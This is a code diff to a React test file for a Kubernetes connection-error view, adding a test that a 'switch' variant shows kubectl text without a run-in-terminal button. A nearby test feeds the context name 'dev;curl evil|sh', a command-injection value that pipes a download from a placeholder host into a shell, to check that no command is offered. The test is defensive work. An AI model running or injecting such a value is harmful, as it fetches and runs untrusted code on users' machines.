@@ -264,6 +264,19 @@ describe('ConnectionErrorView credential plugin failure on a non-cloud context',
     expect(markup).not.toContain('Authenticate in terminal')
   })
 
+  it('offers copy only after a refused switch', () => {
+    const markup = renderToStaticMarkup(
+      <ConnectionErrorView
+        connection={{ state: 'disconnected', context: 'oidc@dev', errorType: 'auth', error: 'safe error' }}
+        onRetry={() => {}}
+        isRetrying={false}
+        variant="switch"
+      />,
+    )
+    expect(markup).toContain('>kubectl</span>')
+    expect(markup).not.toContain('aria-label="Run command in terminal"')
+  })
+
   it('offers no command for a context name that is unsafe to type into a shell', () => {
     expect(selectConnectionHints('auth', 'dev;curl evil|sh', undefined, undefined, true, true)?.authCommand).toBeUndefined()
   })
